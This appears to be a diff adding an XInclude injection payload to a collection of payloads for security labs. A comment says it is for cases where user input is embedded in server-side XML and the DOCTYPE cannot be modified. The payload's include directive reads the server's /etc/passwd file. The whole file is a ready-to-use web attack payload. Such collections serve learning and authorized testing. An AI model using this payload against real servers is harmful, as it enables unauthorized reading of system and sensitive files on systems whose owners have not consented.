@@ -1,0 +1,8 @@
+<!--
+Payload: XInclude Injection
+Usage: When you can't modify the DOCTYPE but user input is embedded in server-side XML.
+Lab: Exploiting XInclude to retrieve files
+-->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
